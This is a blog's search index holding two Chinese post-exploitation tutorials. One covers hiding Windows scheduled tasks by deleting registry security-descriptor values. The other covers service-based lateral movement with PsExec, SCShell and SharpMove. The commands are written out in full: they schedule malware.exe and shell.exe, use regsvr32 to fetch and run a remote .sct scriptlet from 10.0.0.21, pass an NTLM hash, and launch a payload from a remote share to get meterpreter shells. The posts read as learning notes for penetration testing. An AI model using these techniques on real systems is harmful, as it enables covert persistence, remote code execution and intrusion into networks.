<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Windows下任务计划隐藏方式</title>
    <url>/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<img src="https://faithlove.github.io/pic/2018/HexoThumb/topPicPre.png" width="100%">
<span id="more"></span>
------------------------------------


<h3 id="作者：REInject-73lab-青藤实验室"><a href="#作者：REInject-73lab-青藤实验室" class="headerlink" title="作者：REInject@73lab@青藤实验室"></a>作者：REInject@73lab@青藤实验室</h3><p>原文链接：<a href="https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw">https://mp.weixin.qq.com/s/ktGug1VbSpmzh9CEGKbbdw</a></p>
<h4 id="计划任务的创建方式"><a href="#计划任务的创建方式" class="headerlink" title="计划任务的创建方式"></a>计划任务的创建方式</h4><p><strong>命令行创建计划</strong>任务包括 at.exe 和 schtasks.exe<br><strong>at.exe</strong><br>使用 at 命令创建计划任务的方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">at <span class="number">11</span>:<span class="number">11</span> /every:Sunday,Monday,Tue**sday <span class="string">&quot;malware.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>以上命令将创建一个计划任务，在每周日、周一、周二的 11:11 执行 malware.exe<br><strong>schtasks.exe</strong><br>at.exe 在 windows8 开始就弃用了，之后的系统都是使用 schtasks.exe 创建计划任务，该命令参数信息请自行百度或者HELP查看<br>例:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;c:\Windows\System32\schtasks.exe&quot;</span> /Create /SC ONCE /TN test /TR <span class="string">&quot;cmd /c \&quot;start /min C:\ProgramData\shell.exe\&quot;&quot;</span> /ST <span class="number">20</span>:<span class="number">21</span></span><br></pre></td></tr></table></figure>
<p>这个命令中使用了 /TN 指定任务名称为 test，/TR 参数指定运行的恶意命令，/ST 指定了运行时间，/SC 指定运行周期，还可以通过 /ED 参数指定任务终止日期等</p>
<p>一旦任务创建，将会自动在目录 %SystemRoot%\System32\Tasks 生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息</p>
<p><strong>图形界面创建计划任务</strong><br>win+r启动taskschd.msc<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/taskschd.msc.jpg" alt="Alt text"><br>需要注意的是，通过 taskschd.msc 创建的任务会直接从托管 Task Scheduler 服务的 svchost.exe 进程派生</p>
<p><strong>代码创建计划任务</strong><br>代码最终都是和</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">c:\windows\system32\taskschd.dll</span><br></pre></td></tr></table></figure>
<p>提供的 COM 服务交互，它的 GUID 是 0F87369F-A4E5-4CFC-BD3E-73E6154572DD</p>
<h3 id="深入理解计划任务"><a href="#深入理解计划任务" class="headerlink" title="深入理解计划任务"></a>深入理解计划任务</h3><h4 id="计划任务的父进程"><a href="#计划任务的父进程" class="headerlink" title="计划任务的父进程"></a>计划任务的父进程</h4><p>运行计划任务的相关服务是：Task Scheduler。该服务使用 svchost.exe 的 netsvcs 组进行托管<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/services.jpg" alt="Alt text"></p>
<h4 id="计划任务相关注册表项"><a href="#计划任务相关注册表项" class="headerlink" title="计划任务相关注册表项"></a>计划任务相关注册表项</h4><p>在 XP 时，计划任务注册表路径为</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\S</span>chedulingAgent</span><br></pre></td></tr></table></figure>
<p>Win7 以后发生变化，变成</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule</span><br></pre></td></tr></table></figure>
<p>子项有：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/zixiang.jpg" alt="Alt text"><br>任务项信息除了在磁盘中的 %SystemRoot%\System32\Tasks 下之外，还在下面的注册表项中存在：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache</span><br></pre></td></tr></table></figure>
<p>Schedule\TaskCache子项 :<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/zixiang2.jpg" alt="Alt text"><br>Tree 子项以任务名称命名，每个任务下的 Value 结构如下：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/zixiang3.jpg" alt="Alt text"><br>每个 Schedule\TaskCache\Tasks%GUID% 对应一个任务，有这些 Value :<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/value.jpg" alt="Alt text"></p>
<h4 id="计划任务的安全描述符（SD）"><a href="#计划任务的安全描述符（SD）" class="headerlink" title="计划任务的安全描述符（SD）####"></a>计划任务的安全描述符（SD）####</h4><p>计划任务的 SD 配置在注册表中的位置：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree<span class="symbol">\&#123;</span>TaskName&#125;<span class="symbol">\S</span>D</span><br></pre></td></tr></table></figure>
<h4 id="SD的作用"><a href="#SD的作用" class="headerlink" title="SD的作用"></a>SD的作用</h4><p>经过进程监控，发现在计划任务信息查询过程中的流程如下：</p>
<p>查询 </p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree<span class="symbol">\S</span>D</span><br></pre></td></tr></table></figure>
<p>查的到继续，查不到则终止查询<br>遍历查询 </p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree<span class="symbol">\&#123;</span>TaskName&#125; </span><br></pre></td></tr></table></figure>
<p>中的 Id、Index、SD等值<br>查询到的 SD 值，会对之后是否有权限查看该任务信息有影响，查不查的到和这个值息息相关<br>根据 SD 值，进行权限检查<br>如果权限通过，格式化输出 </p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKLM<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>asks<span class="symbol">\&#123;</span>TaskId&#125;</span><br></pre></td></tr></table></figure>
<p>中的任务详细信息<br>权限不通过，则进行下一个任务的查询<br>正常任务查询：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/procmon.jpg" alt="Alt text"><br>删除 SD 后的任务查询：<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/procmonSD.jpg" alt="Alt text"><br>可见，因为找不到任务的 SD 信息，无法确定用户是否有权限查看该任务信息，导致系统直接判定无权限查看:<br><img src="/2021/03/04/Windows%E4%B8%8B%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F/../../../../photo/notfound.jpg" alt="Alt text"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>创建计划任务后会在磁盘中的 %SystemRoot%\System32\Tasks 下生成任务项信息，同时会在注册表</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree\</span><br></pre></td></tr></table></figure>
<p>下创建同名任务项</p>
<h4 id="非完全隐藏"><a href="#非完全隐藏" class="headerlink" title="非完全隐藏"></a>非完全隐藏</h4><p>如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 SD 值</p>
<p>修改</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree</span><br></pre></td></tr></table></figure>
<p>下对应任务的 Index 值为 0或直接删除SD值<br>删除 %SystemRoot%\System32\Tasks 下任务对应的 XML 文件<br>优点： - 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务</p>
<p>缺点： - 如果是修改index值,并非完全隐藏，如果知道该任务的名字，可以通过 schtasks /query /tn {TaskName} 查到,如果是直接删除SD项，除了能在注册表项下看到该计划任务名字，其余方法均无法查到 - 无论是低权的任务还是高权，都需要 SYSTEM 权限</p>
<h4 id="完全隐藏"><a href="#完全隐藏" class="headerlink" title="完全隐藏"></a>完全隐藏</h4><p>以上内容均来源于青藤云文章本地测试所得，在测试过程中，发现直接删除注册表</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\S</span>chedule<span class="symbol">\T</span>askCache<span class="symbol">\T</span>ree\</span><br></pre></td></tr></table></figure>
<p>下的对应任务项，计划任务仍在运行，由此实现完全隐藏，但重启之后计划任务就会失效，且无法删除</p>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>基于服务的横向渗透学习</title>
    <url>/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<img src="https://faithlove.github.io/pic/2018/DynamicProxy/topPicPre.png" width="100%">
<span id="more"></span>

<p>前几天在pentestlab学习了一个新的想法，想着就打算写篇文章加深一下<br>###原文链接:<a href="https://pentestlab.blog/2020/07/21/lateral-movement-services">https://pentestlab.blog/2020/07/21/lateral-movement-services</a> ###</p>
<h2 id="基于服务的横向渗透"><a href="#基于服务的横向渗透" class="headerlink" title="基于服务的横向渗透"></a>基于服务的横向渗透</h2><p><strong>PSEXEC</strong><br>原理:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>利用ADMIN$共享放<span class="module-access"><span class="module"><span class="identifier">Psexesvc</span>.</span></span>exe至远程主机</span><br><span class="line"><span class="number">2.</span>通过服务管理SCManager远程创建psexecsvc服务，并启动服务</span><br><span class="line"><span class="number">3.</span>客户端连接执行命令，服务端启动相应的程序并执行回显数据</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ol>
<li>PSEXESVC服务将会安装在远程系统中，此时将会生成Event 4697和Event 7045这两种事件日志。需要注意的是，Event 4697日志记录将有可能包含账号信息。</li>
<li>程序Psexesvc.exe会提取到windows目录下</li>
<li>安装服务会留下明显的日志，而且服务没有删除的风险更大，管理员很容易就会发现</li>
</ol>
<p>个人水平有限，除了psexec暂时没了解到其它的基于服务的手段(当然你也可以手动连接上传文件创建服务）</p>
<p><strong>SCSHELL</strong><br>国外大牛MrUn1k0d3r在工具中用了一种新的方法,利用OpenSCManager API对现有服务的二进制文件进行直接修改,并且可以配合regsvr32使文件不落地</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">SCShell.exe 10.0.0.11 XblAuthManager &quot;C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>md.exe /c C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\r</span>egsvr32.exe /s /n /u /i:http://10.0.0.21:8080/p</span><br><span class="line">entestlab.sct scrobj.dll&quot; . pentestlab Password123</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell.png" alt="Alt text"></p>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell-meterpreter.png" alt="Alt text"></p>
<p>工具里配套了python版本的工具,python版使用了DCERPC来认证，不是SMB，这样就可以在非域的机器上使用(配合代理使用)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> scshell.py pentestlaboratories/pentestlab@<span class="number">10.0.0.11</span> -hashes aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">58</span>a<span class="number">478135</span>a<span class="number">93</span>ac<span class="number">3</span>bf<span class="number">058</span>a<span class="number">5</span>ea<span class="number">0</span>e<span class="number">8</span>fdb<span class="number">71</span></span><br><span class="line"><span class="attribute">C</span>:\windows\system<span class="number">32</span>\cmd.exe /c C:\windows\system<span class="number">32</span>\regsvr<span class="number">32</span>.exe /s /n /u /i:http://<span class="number">10.0.0.21:8080</span>/pentestlab.sct scrobj.dll</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-scshell-python.png" alt="Alt text"></p>
<p>另一种方法是利用WMI来利用(SharpMOVE)</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SharpMove.exe <span class="attribute">action</span>=modsvc <span class="attribute">computername</span>=PC1 <span class="attribute">command</span>=<span class="string">&quot;cmd.exe /c \\10.0.0.21\pentestlab\pentestlab.exe&quot;</span> <span class="attribute">amsi</span>=<span class="literal">true</span> <span class="attribute">servicename</span>=pentestlab <span class="attribute">username</span>=pentestlab <span class="attribute">password</span>=Password123</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-sharpmove.png" alt="Alt text"><br><img src="/2021/03/08/%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/../../../../photo/lateral-movement-sharpmove-meterpreter.png" alt="Alt text"><br>工具地址:<a href="https://github.com/Mr-Un1k0d3r/SCShell">https://github.com/Mr-Un1k0d3r/SCShell</a><br><a href="https://github.com/0xthirteen/SharpMove">https://github.com/0xthirteen/SharpMove</a><br>(本人只是搬运工）</p>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>后渗透</tag>
      </tags>
  </entry>
</search>
